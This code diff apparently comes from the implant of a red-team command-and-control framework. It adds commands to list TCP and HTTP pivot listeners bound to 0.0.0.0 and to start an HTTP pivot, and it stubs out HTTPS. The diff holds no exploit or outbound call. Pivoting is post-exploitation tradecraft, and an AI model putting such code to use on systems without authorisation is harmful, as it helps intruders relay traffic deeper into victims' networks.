@@ -25,16 +25,32 @@ namespace Agent.Commands
             var pivotService = ServiceProvider.GetService<IPivotService>();
             if (task.SplittedArgs[0] == ShowVerb)
             {
-                var list = new SharpSploitResultList<ListPivotsResult>();
-                //foreach (var pivot in pivotService.Ge)
-                //{
-                    //list.Add(new ListPivotsResult()
-                    //{
-                    //	Type = service.Ty,
-                    //	Status = service.Status == RunningStatus.Running ? "[Running]" : "[Off]"
-                    //});
+                if(!pivotService.TCPServers.Any() && !pivotService.HTTPServers.Any())
+                {
+                    context.Result.Result = "No pivots configured!";
+                    return;
+                }
 
-                //}
+                var list = new SharpSploitResultList<ListPivotsResult>();
+                foreach (var pivot in pivotService.TCPServers)
+                {
+                    list.Add(new ListPivotsResult()
+                    {
+                        Type = pivot.Type,
+                        BindTo = "0.0.0.0:" + pivot.Port.ToString(),
+                    });
+
+                }
+
+                foreach (var pivot in pivotService.HTTPServers)
+                {
+                    list.Add(new ListPivotsResult()
+                    {
+                        Type = pivot.Type,
+                        BindTo = "0.0.0.0:" + pivot.Port.ToString(),
+                    });
+
+                }
                 context.Result.Result = list.ToString();
                 return;
             }
@@ -71,6 +87,29 @@ namespace Agent.Commands
                     context.Result.Result = $"TCPS pivot started on port {port}";
                 }
 
+                if (task.SplittedArgs[1].ToLower() == "http")
+                {
+                    var port = int.Parse(task.SplittedArgs[2]);
+                    if (pivotService.IsPivotRunningOnPort(port))
+                    {
+                        context.Result.Result = $"A pivot is already running on port {port}";
+                        return;
+                    }
+                    pivotService.AddHTTPServer(port, false);
+                    context.Result.Result = $"HTTP pivot started on port {port}";
+                }
+
+                if (task.SplittedArgs[1].ToLower() == "https")
+                {
+                    var port = int.Parse(task.SplittedArgs[2]);
+                    if (pivotService.IsPivotRunningOnPort(port))
+                    {
+                        context.Result.Result = $"A pivot is already running on port {port}";
+                        return;
+                    }
+                    context.Result.Result = $"HTTPS pivot is not supported";
+                }
+
 
             }
 
@@ -101,12 +140,12 @@ namespace Agent.Commands
         {
 
             public string Type { get; set; }
-            public string EndPoint { get; set; }
+            public string BindTo { get; set; }
 
             protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>()
             {
                 new SharpSploitResultProperty { Name = nameof(Type), Value = Type },
-                new SharpSploitResultProperty { Name = nameof(EndPoint), Value = EndPoint },
+                new SharpSploitResultProperty { Name = nameof(BindTo), Value = BindTo },
             };
         }
     }
